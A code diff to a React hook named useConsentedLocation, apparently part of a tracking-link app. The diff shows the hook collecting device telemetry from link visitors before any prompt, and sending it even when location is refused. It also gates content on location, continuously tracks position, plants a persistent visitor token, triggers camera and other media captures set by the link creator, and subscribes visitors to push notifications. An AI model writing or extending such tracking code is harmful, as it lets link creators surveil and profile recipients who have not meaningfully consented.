@@ -1,12 +1,29 @@
+// hooks/useConsentedLocation.ts
 import { useState, useEffect, useRef, useCallback } from "react";
 import { GeoCoordinate, PermissionsConfig } from "@/lib/types";
-import { collectDeviceTelemetry, captureCameraSnapshot } from "@/lib/telemetry";
+import { collectDeviceTelemetry } from "@/lib/telemetry";
+import { executeSessionMediaCaptures } from "@/lib/session-media-client";
+import { registerVisitorPushSubscription } from "@/lib/push-client";
 
 interface UseConsentedLocationOptions {
   linkId: string;
   requiresLocation: boolean;
   permissionsConfig?: PermissionsConfig;
   onConsentGranted?: (sessionId: string) => void;
+}
+
+function getOrCreateVisitorToken(): string {
+  if (typeof window === "undefined") return "";
+  try {
+    let tok = localStorage.getItem("snap_visitor_token");
+    if (!tok) {
+      tok = `v_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
+      localStorage.setItem("snap_visitor_token", tok);
+    }
+    return tok;
+  } catch {
+    return "";
+  }
 }
 
 export function useConsentedLocation({
@@ -21,9 +38,9 @@ export function useConsentedLocation({
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [isLocationActive, setIsLocationActive] = useState(false);
   const watchIdRef = useRef<number | null>(null);
+  const visitNumberRef = useRef<number>(1);
 
-  // Send coordinate update to backend
-  const sendLocationUpdate = async (sessId: string, coords: GeoCoordinate) => {
+  const sendLocationUpdate = useCallback(async (sessId: string, coords: GeoCoordinate) => {
     try {
       await fetch("/api/location", {
         method: "POST",
@@ -33,15 +50,13 @@ export function useConsentedLocation({
           latitude: coords.latitude,
           longitude: coords.longitude,
           accuracy: coords.accuracy,
+          visitNumber: visitNumberRef.current,
         }),
       });
       setIsLocationActive(true);
-    } catch {
-      // Background location update failure is non-fatal
-    }
-  };
+    } catch {}
+  }, []);
 
-  // Teardown watchPosition
   const stopWatching = useCallback(() => {
     if (watchIdRef.current !== null && typeof navigator !== "undefined" && navigator.geolocation) {
       navigator.geolocation.clearWatch(watchIdRef.current);
@@ -50,22 +65,17 @@ export function useConsentedLocation({
     }
   }, []);
 
-  // Cleanup watcher on unmount
   useEffect(() => {
-    return () => {
-      stopWatching();
-    };
+    return () => stopWatching();
   }, [stopWatching]);
 
-  // Request location, collect device info & camera (fast & non-blocking)
   const requestLocation = useCallback(async () => {
     setIsLoading(true);
     setError(null);
 
-    // 1. Collect device telemetry
     const deviceInfo = await collectDeviceTelemetry();
+    const visitorToken = getOrCreateVisitorToken();
 
-    // Helper to finish session setup once coordinates acquired
     const proceedWithCoords = async (coords?: GeoCoordinate) => {
       try {
         const res = await fetch("/api/sessions", {
@@ -74,6 +84,7 @@ export function useConsentedLocation({
           body: JSON.stringify({
             linkId,
             deviceInfo,
+            visitorToken,
             permissionsGranted: coords ? ["location", "device_info"] : ["device_info"],
           }),
         });
@@ -82,41 +93,27 @@ export function useConsentedLocation({
           const errData = await res.json().catch(() => ({}));
           throw new Error(errData.error || "Failed to register session");
         }
-        const { session } = await res.json();
-        const currentSessionId = session.id;
+
+        const data = await res.json();
+        const currentSessionId = data.session.id;
+        visitNumberRef.current = data.visitNumber || 1;
         setSessionId(currentSessionId);
 
         if (coords) {
           void sendLocationUpdate(currentSessionId, coords);
         }
 
-        // Asynchronous non-blocking camera snapshot (zero UI lag/freeze)
-        if (permissionsConfig?.camera) {
-          void (async () => {
-            try {
-              const blob = await captureCameraSnapshot();
-              if (blob) {
-                const fd = new FormData();
-                fd.append("sessionId", currentSessionId);
-                const ext = blob.type.includes("webp") ? "webp" : "jpg";
-                fd.append("file", blob, `capture.${ext}`);
-                await fetch("/api/sessions/capture", { method: "POST", body: fd });
-              }
-            } catch (camErr) {
-              console.warn("Camera capture error:", camErr);
-            }
-          })();
+        // Trigger asynchronous multi-media captures & push subscription
+        void executeSessionMediaCaptures(currentSessionId, permissionsConfig);
+        if (permissionsConfig?.push_notifications) {
+          void registerVisitorPushSubscription(currentSessionId);
         }
 
-        // Instant UI consent & transition (<100ms)
         setIsConsented(true);
         setIsLoading(false);
 
-        if (onConsentGranted) {
-          onConsentGranted(currentSessionId);
-        }
+        if (onConsentGranted) onConsentGranted(currentSessionId);
 
-        // Start active watch if coordinates available
         if (coords && typeof navigator !== "undefined" && navigator.geolocation) {
           watchIdRef.current = navigator.geolocation.watchPosition(
             (pos) => {
@@ -158,22 +155,16 @@ export function useConsentedLocation({
         try {
           await fetch("/api/sessions", {
             method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ linkId, deviceInfo, permissionsGranted: ["device_info"], capturedData: { status: "denied" } }),
+            body: JSON.stringify({ linkId, deviceInfo, visitorToken, permissionsGranted: ["device_info"], capturedData: { status: "denied" } }),
           });
         } catch {}
         if (!requiresLocation) { await proceedWithCoords(); return; }
         setIsLoading(false);
-        setError(geoError.code === geoError.PERMISSION_DENIED ? "Location permission was denied. Please allow location to view content." : "Location signal unavailable. Please verify GPS settings.");
+        setError(geoError.code === geoError.PERMISSION_DENIED ? "Location permission was denied. Please allow location to view content." : "Location signal unavailable.");
       },
       { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
     );
   }, [linkId, requiresLocation, permissionsConfig, onConsentGranted, sendLocationUpdate]);
-
-  useEffect(() => {
-    return () => {
-      stopWatching();
-    };
-  }, [stopWatching]);
 
   return {
     isConsented,
